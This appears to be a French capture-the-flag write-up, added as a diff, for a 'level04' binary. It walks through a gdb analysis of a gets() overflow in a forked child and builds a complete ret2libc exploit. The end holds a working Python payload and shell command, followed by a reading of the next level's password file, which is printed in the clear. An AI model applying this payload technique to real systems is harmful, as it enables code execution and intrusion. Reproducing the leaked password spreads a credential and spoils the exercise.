@@ -1,0 +1,72 @@
+On a un programme, qui quand on l'execute nous demande d'introduire un shellcode.
+Quand on observe plus en details avec gdb, on remarque un fork. il y a donc l'execution d'un processus enfant au cours du programme.
+On remarque aussi qu'il n'y a aucune mention d'un system("/bin/sh") dans le programme.
+On suppose alors qu'il faudra faire un overflow.
+Effectivement, on a bien un gets qui pourraient nous permettre un overflow.
+Le gets stockera ce qu'on ecrit dans le stdin à l'addresse $esp+0x20. 
+Cependant le gets à lieu dans le processus enfant.
+Le processus enfant et une copie du processus parents. Dans le programme, on va set à 0 32 octets apres le début du buffer.
+Mais si on dépasse au dela des 32 octets, les addresses qui était stockée au dela dans le processus parents vont être overflow dans le processus enfant.
+Si on arrive à overflow la bonne addresse, on pourra peut etre faire un retToLibc
+
+Pour suivre le processus enfant dans gdb, on utilise : 
+(gdb) set follow-fork-mode child
+
+(gdb) set follow-fork-mode child
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level04/level04 
+[New process 1883]
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1883]
+0x41326641 in ?? ()
+
+L'overflow dans le processus enfant à lieu à la 156e position.
+
+Il ne reste plus qu'à trouver les fonctions nécessaires pour un retToLibc :
+une fonction system, une fonction exit, et une mention "/bin/sh"
+
+(gdb) b main
+Breakpoint 1 at 0x80486cd
+(gdb) run
+Starting program: /home/users/level04/level04 
+Breakpoint 1, 0x080486cd in main ()
+(gdb) p system
+    $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+    $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) info proc map
+    process 1846
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
+	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
+	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
+	0xf7e2b000 0xf7e2c000     0x1000        0x0 
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0 
+	0xf7fda000 0xf7fdb000     0x1000        0x0 
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000, 0xf7ffe000, "/bin/sh"
+0xf7f897ec
+
+
+
+$ python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]' > /tmp/exploit
+
+$ cat /tmp/exploit - | ./level04 
+Give me some shellcode, k
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
